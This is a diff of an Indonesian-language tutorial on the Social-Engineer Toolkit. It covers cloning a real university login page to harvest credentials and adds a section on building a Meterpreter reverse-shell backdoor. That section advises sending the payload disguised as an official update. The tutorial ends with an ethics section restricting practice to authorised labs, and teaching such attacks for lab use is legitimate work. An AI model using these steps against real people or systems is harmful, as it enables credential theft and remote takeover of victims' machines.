@@ -67,7 +67,7 @@ Contoh skenario:
    set> 
    ```
 
-2. Ini merupakan menu utama dari tool SET. Untuk melakukan serangan phishing pilih menu nomer `1` yaitu `Social-Engineering Attacks`.
+2. Ini merupakan menu utama dari tool SET. Untuk melakukan serangan phishing pilih menu nomer `1` yaitu `Social-Engineering Attacks`:
 
    ```
       It's easy to update using the PenTesters Framework! (PTF)
@@ -88,7 +88,7 @@ Contoh skenario:
    set> 
    ```
 
-3. Setelah masuk ke dalam menu `Social-Engineering Attacks`, langkah selanjutnya pilih menu nomer `2` yaitu `Website Attack Vectors`.
+3. Setelah masuk ke dalam menu `Social-Engineering Attacks`, langkah selanjutnya pilih menu nomer `2` yaitu `Website Attack Vectors`:
 
    ```
       It's easy to update using the PenTesters Framework! (PTF)
@@ -110,7 +110,7 @@ Contoh skenario:
    set:webattack>
    ```
 
-4. Pada menu ini kita pilih menu nomer `3` yaitu `Credential Harvester Attack Method`.
+4. Pada menu ini kita pilih menu nomer `3` yaitu `Credential Harvester Attack Method`:
 
    ```
     The first method will allow SET to import a list of pre-defined web
@@ -133,7 +133,7 @@ Contoh skenario:
    set:webattack>
    ```
 
-5. Pada menu ini kita pilih menu nomer `2` yaitu `Site Cloner`.
+5. Pada menu ini kita pilih menu nomer `2` yaitu `Site Cloner`:
 
    ```
    [-] Credential harvester will allow you to utilize the clone capabilities within SET
@@ -160,7 +160,7 @@ Contoh skenario:
    set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.1.42]:
    ```
 
-6. Pada tahap ini, kita diminta untuk memasukkan alamat IP yang akan digunakan sebagai tujuan `POST back`. Anda bisa langsung menekan `Enter` untuk menggunakan alamat IP default (yang terdeteksi otomatis).
+6. Pada tahap ini, kita diminta untuk memasukkan alamat IP yang akan digunakan sebagai tujuan `POST back`. Anda bisa langsung menekan `Enter` untuk menggunakan alamat IP default (yang terdeteksi otomatis):
 
    ```
    [-] SET supports both HTTP and HTTPS
@@ -168,7 +168,7 @@ Contoh skenario:
    set:webattack> Enter the url to clone: 
    ```
 
-7. Pada tahap ini kita diminta untuk memasukkan alamat url yang mau kita clone. di sini sebagai contoh, kita masukkan url login dari website login `SIMAK UI` (Universitas Indonesia).
+7. Pada tahap ini kita diminta untuk memasukkan alamat url yang mau kita clone. di sini sebagai contoh, kita masukkan url login dari website login `SIMAK UI` (Universitas Indonesia):
 
    ```
    set:webattack> Enter the url to clone: https://penerimaan.ui.ac.id/login
@@ -182,7 +182,7 @@ Contoh skenario:
    [*] Information will be displayed to you as it arrives below:
    ```
 
-8. Tahap selanjutnya adalah mengirim tautan phishing kepada target, misalnya melalui `email` atau `pesan instan`. Tunggu sampai korban memasukkan `username/email` dan `password` yang benar.
+8. Tahap selanjutnya adalah mengirim tautan phishing kepada target, misalnya melalui `email` atau `pesan instan`. Tunggu sampai korban memasukkan `username/email` dan `password` yang benar:
 
    ```
    [*] WE GOT A HIT! Printing the output:
@@ -200,7 +200,165 @@ Contoh skenario:
    password=adminui123
    ```
 
-## E. Etika & Hukum
+## E. Praktik: Reverse Shell
+
+1. Jalankan tool SET:
+
+   ```
+   sudo setoolkit
+
+   ```
+
+2. Pilih menu nomor `1`:
+
+   ```
+   Visit: https://www.trustedsec.com
+
+      It's easy to update using the PenTesters Framework! (PTF)
+   Visit https://github.com/trustedsec/ptf to update all your tools!
+
+
+    Select from the menu:
+
+      1) Social-Engineering Attacks
+      2) Penetration Testing (Fast-Track)
+      3) Third Party Modules
+      4) Update the Social-Engineer Toolkit
+      5) Update SET configuration
+      6) Help, Credits, and About
+
+     99) Exit the Social-Engineer Toolkit
+   ```
+
+3. Pilih menu nomor `4`:
+
+   ```
+   It's easy to update using the PenTesters Framework! (PTF)
+   Visit https://github.com/trustedsec/ptf to update all your tools!
+
+
+    Select from the menu:
+
+      1) Spear-Phishing Attack Vectors
+      2) Website Attack Vectors
+      3) Infectious Media Generator
+      4) Create a Payload and Listener
+      5) Mass Mailer Attack
+      6) Arduino-Based Attack Vector
+      7) Wireless Access Point Attack Vector
+      8) QRCode Generator Attack Vector
+      9) Powershell Attack Vectors
+     10) Third Party Modules
+
+     99) Return back to the main menu.
+
+   set> 
+   ```
+
+4. Pilih menu nomor `4`:
+
+   > knp menu nomor 4? karena biar kita bisa masuk ke sesi Meterpreter-nya. dimana kita bisa banyak melakukan banyak hal didalamnya.
+   
+   ```
+      1) Windows Shell Reverse_TCP               Spawn a command shell on victim and send back to attacker
+      2) Windows Reverse_TCP Meterpreter         Spawn a meterpreter shell on victim and send back to attacker
+      3) Windows Reverse_TCP VNC DLL             Spawn a VNC server on victim and send back to attacker
+      4) Windows Shell Reverse_TCP X64           Windows X64 Command Shell, Reverse TCP Inline
+      5) Windows Meterpreter Reverse_TCP X64     Connect back to the attacker (Windows x64), Meterpreter
+      6) Windows Meterpreter Egress Buster       Spawn a Meterpreter shell and find a port home via multiple ports
+      7) Windows Meterpreter Reverse HTTPS       Tunnel communication over HTTP using SSL and use Meterpreter
+      8) Windows Meterpreter Reverse DNS         Use a hostname instead of an IP address and use Reverse Meterpreter
+      9) Download/Run your Own Executable        Downloads an executable and runs it
+
+   set:payloads>
+   ```
+
+5. Masukkan alamat IP kita:
+
+   ```
+   set:payloads> IP address for the payload listener (LHOST): 192.168.1.42
+   ```
+
+6. Masukkan nomor port untuk menerima koneksi balik:
+
+   ```
+   set:payloads> Enter the PORT for the reverse listener: 4444
+   ```
+
+7. Backdoor sudah berhasil dibuat dan disimpan di: `/root/.set/payload.exe`
+
+   ```
+   [*] Generating the payload.. please be patient.
+   [*] Payload has been exported to the default SET directory located under: /root/.set/payload.exe
+   set:payloads> Do you want to start the payload and listener now? (yes/no): 
+   ```
+
+8. Tools SET nanya mau menjalankan payload dan listener sekarang atau tidak, kita jawab: `yes`
+
+   Tool SET akan menjalankan Metasploit dan menggunakan modul `exploit/multi/handler` sebagai listener (untuk menerima koneksi balik).
+
+   Proses eksploitasi dijalankan secara backound yang ditandai dengan `resource (/root/.set/meta_config)> exploit -j`:
+   
+   ```
+   [*] Processing /root/.set/meta_config for ERB directives.
+   resource (/root/.set/meta_config)> use multi/handler
+   [*] Using configured payload generic/shell_reverse_tcp
+   resource (/root/.set/meta_config)> set payload windows/meterpreter/reverse_tcp
+   payload => windows/meterpreter/reverse_tcp
+   resource (/root/.set/meta_config)> set LHOST 192.168.1.42
+   LHOST => 192.168.1.42
+   resource (/root/.set/meta_config)> set LPORT 4444
+   LPORT => 4444
+   resource (/root/.set/meta_config)> set ExitOnSession false
+   ExitOnSession => false
+   resource (/root/.set/meta_config)> exploit -j
+   [*] Exploit running as background job 0.
+   [*] Exploit completed, but no session was created.
+   [*] Starting persistent handler(s)...
+   [*] Started reverse TCP handler on 192.168.1.42:4444 
+   msf6 exploit(multi/handler) >
+   ```
+
+9. Tahap selanjutnya kirim backdoor yang berhasil dibuat tadi ke target, bikin agar seolah-olah backdoor itu adalah aplikasi update dari official resmi. Tunggu sampai target membuka backddor tersebut.
+
+   Jika target membuka backdoor tersebut kita akan mendapatkan sesi Meterpreter:
+
+   ```
+   [*] Exploit running as background job 0.
+   [*] Exploit completed, but no session was created.
+   [*] Starting persistent handler(s)...
+   [*] Started reverse TCP handler on 192.168.1.42:4444 
+   msf6 exploit(multi/handler) > 
+   [*] Sending stage (177734 bytes) to 192.168.1.45
+   [*] Meterpreter session 1 opened (192.168.1.42:4444 -> 192.168.1.45:49168) at 2025-05-11 06:30:36 +0700
+   ```
+
+   Ketik `sessions` untuk melihat semua sesi yang aktif:
+
+   ```
+   [*] Sending stage (177734 bytes) to 192.168.1.45
+   [*] Meterpreter session 1 opened (192.168.1.42:4444 -> 192.168.1.45:49171) at 2025-05-11 06:34:48 +0700
+   sessions 
+
+   Active sessions
+   ===============
+
+     Id  Name  Type                     Information                Connection
+     --  ----  ----                     -----------                ----------
+     1         meterpreter x86/windows  admin-PC\admin @ ADMIN-PC  192.168.1.42:4444 -> 192.168.1.45:49171 (192.168.1.45)
+
+   msf6 exploit(multi/handler) >
+   ```
+
+   Dari hasil tersebut, sesi Meterpreter yang aktif memiliki ID `1`. Untuk masuk ke sesi tersebut, ketik perintah:
+
+   ```
+   session -i 1
+   ```
+
+   Tara...! Selamat Anda sudah masuk ke sesi Meterpreter-nya. Di sini Anda bisa melakukan banyak hal.
+    
+## F. Etika & Hukum
 
 - Dilarang menjalankan serangan ini di dunia nyata tanpa izin tertulis.
 - Praktik hanya di lab/lab simulasi.
